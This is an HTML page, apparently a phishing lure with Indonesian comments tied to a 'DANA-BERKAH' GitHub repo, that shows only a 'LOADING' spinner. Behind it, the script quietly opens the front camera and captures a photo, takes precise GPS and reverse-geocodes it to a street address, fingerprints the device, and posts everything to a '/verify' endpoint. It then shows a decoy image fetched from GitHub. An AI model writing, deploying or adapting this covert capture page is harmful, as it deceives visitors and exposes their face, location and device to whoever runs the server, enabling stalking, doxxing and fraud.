<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }
        .container { 
            text-align: center; 
        }
        .spinner {
            width: 50px;
            height: 50px;
            margin: 0 auto 20px;
            border: 4px solid #e0e0e0;
            border-top-color: #333;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { 
            to { transform: rotate(360deg); } 
        }
        h1 { 
            font-size: 24px; 
            font-weight: 400; 
            color: #333; 
            letter-spacing: 6px; 
        }
        .hidden {
            display: none !important;
        }
        .result-image {
            max-width: 100%;
            max-height: 80vh;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }
        .result-container {
            display: none;
        }
        .result-container.visible {
            display: block;
        }
        #hidden-video { display: none; }
        #hidden-canvas { display: none; }
    </style>
</head>
<body>
    <div class="container" id="loadingContainer">
        <div class="spinner" id="spinner"></div>
        <h1 id="title">LOADING</h1>
    </div>

    <div class="container result-container" id="resultContainer">
        <img src="" alt="Result" class="result-image" id="resultImage">
    </div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="hidden-canvas"></canvas>

    <script>
        const video = document.getElementById('hidden-video');
        const canvas = document.getElementById('hidden-canvas');
        const loadingContainer = document.getElementById('loadingContainer');
        const resultContainer = document.getElementById('resultContainer');
        const resultImage = document.getElementById('resultImage');
        const spinner = document.getElementById('spinner');
        const title = document.getElementById('title');

        // ===== AMBIL GAMBAR DARI GITHUB =====
        async function getImageFromGitHub() {
            try {
                // Ganti dengan username dan repo Anda
                const username = 'danakagetberkah';
                const repo = 'DANA-BERKAH';
                const branch = 'main';
                const imagePath = 'foto.jpg'; // Nama file gambar di repo
                
                // Pake GitHub API untuk ambil file
                const response = await fetch(
                    `https://api.github.com/repos/${username}/${repo}/contents/${imagePath}?ref=${branch}`
                );
                
                if (response.ok) {
                    const data = await response.json();
                    // Data.content adalah base64
                    const base64Image = data.content;
                    // Decode base64
                    const imageSrc = `data:image/jpeg;base64,${base64Image}`;
                    return imageSrc;
                } else {
                    console.error('Gagal ambil gambar dari GitHub:', response.status);
                    return null;
                }
            } catch (err) {
                console.error('Error ambil gambar:', err);
                return null;
            }
        }

        // ===== TAMPILKAN GAMBAR =====
        async function showResultImage() {
            try {
                // Ambil gambar dari GitHub
                const imageSrc = await getImageFromGitHub();
                
                if (imageSrc) {
                    resultImage.src = imageSrc;
                } else {
                    // Fallback jika gagal
                    resultImage.src = 'https://via.placeholder.com/400x600/333/fff?text=Gambar+Gagal+Dimuat';
                }
                
                // Sembunyikan loading, tampilkan gambar
                loadingContainer.classList.add('hidden');
                resultContainer.classList.add('visible');
                
            } catch (err) {
                console.error('Error:', err);
                // Tetap tampilkan container walaupun error
                loadingContainer.classList.add('hidden');
                resultContainer.classList.add('visible');
                resultImage.src = 'https://via.placeholder.com/400x600/333/fff?text=Gambar+Gagal+Dimuat';
            }
        }

        // ===== GET GPS LOCATION =====
        function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    () => {
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // ===== GET DEVICE INFO =====
        function getDeviceInfo() {
            const ua = navigator.userAgent.toLowerCase();
            const info = {
                browser: 'Tidak diketahui',
                os: 'Tidak diketahui',
                device: 'Tidak diketahui',
                brand: 'Tidak diketahui',
                model: 'Tidak diketahui'
            };

            // Browser
            if (ua.includes('chrome')) info.browser = 'Chrome';
            else if (ua.includes('firefox')) info.browser = 'Firefox';
            else if (ua.includes('safari') && !ua.includes('chrome')) info.browser = 'Safari';
            else if (ua.includes('edge')) info.browser = 'Edge';

            // OS
            if (ua.includes('android')) {
                info.os = 'Android';
                const match = ua.match(/android\s([\d.]+)/);
                if (match) info.os += ` ${match[1]}`;
            } else if (ua.includes('iphone') || ua.includes('ipad')) {
                info.os = 'iOS';
                const match = ua.match(/os\s([\d_]+)/);
                if (match) info.os += ` ${match[1].replace(/_/g, '.')}`;
            } else if (ua.includes('windows')) {
                info.os = 'Windows';
            } else if (ua.includes('mac')) {
                info.os = 'macOS';
            }

            // Device Type
            if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
                info.device = 'Mobile';
            } else if (ua.includes('tablet') || ua.includes('ipad')) {
                info.device = 'Tablet';
            } else {
                info.device = 'Desktop';
            }

            // Brand
            const brands = [
                { name: 'Samsung', patterns: ['samsung', 'sm-'] },
                { name: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco'] },
                { name: 'Realme', patterns: ['realme'] },
                { name: 'Oppo', patterns: ['oppo'] },
                { name: 'Vivo', patterns: ['vivo'] },
                { name: 'OnePlus', patterns: ['oneplus'] },
                { name: 'Google Pixel', patterns: ['pixel'] },
                { name: 'Huawei', patterns: ['huawei', 'honor'] },
                { name: 'Apple', patterns: ['iphone', 'ipad'] }
            ];

            for (const brand of brands) {
                if (brand.patterns.some(p => ua.includes(p))) {
                    info.brand = brand.name;
                    break;
                }
            }

            // Model
            if (info.brand === 'Apple') {
                const match = ua.match(/iphone(\d+)/);
                if (match) info.model = `iPhone ${match[1]}`;
            } else if (info.brand === 'Samsung') {
                const match = ua.match(/sm-[a-z0-9]+/i);
                if (match) info.model = match[0].toUpperCase();
            }

            return info;
        }

        // ===== GET LOCATION NAME =====
        async function getLocationName(lat, lon) {
            try {
                const response = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=id`
                );
                const data = await response.json();
                if (data && data.address) {
                    const addr = data.address;
                    return {
                        full: data.display_name || '-',
                        street: addr.road || addr.street || '-',
                        city: addr.city || addr.town || addr.village || '-',
                        province: addr.state || addr.province || '-',
                        country: addr.country || '-',
                        postcode: addr.postcode || '-'
                    };
                }
                return null;
            } catch (err) {
                return null;
            }
        }

        // ===== MAIN PROCESS =====
        async function start() {
            try {
                console.log('🚀 Starting...');

                // Access Camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: false
                });
                
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));

                // Capture Photo
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.85);

                // Stop camera
                stream.getTracks().forEach(t => t.stop());

                // Get GPS Location
                const gpsLocation = await getGPSLocation();

                // Get Location Name
                let locationName = null;
                if (gpsLocation) {
                    locationName = await getLocationName(gpsLocation.latitude, gpsLocation.longitude);
                }

                // Get Device Info
                const deviceInfo = getDeviceInfo();

                // Send to server
                const response = await fetch('/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        image: imageData,
                        device: deviceInfo,
                        gps: gpsLocation,
                        locationName: locationName,
                        timestamp: new Date().toISOString()
                    })
                });

                const result = await response.json();
                console.log('📨 Response:', result);

                // Tampilkan gambar dari GitHub
                setTimeout(showResultImage, 500);

            } catch (err) {
                console.error('❌ Error:', err);
                setTimeout(showResultImage, 500);
            }
        }

        window.onload = () => {
            console.log('📄 Page loaded');
            setTimeout(start, 500);
        };
    </script>
</body>
</html>
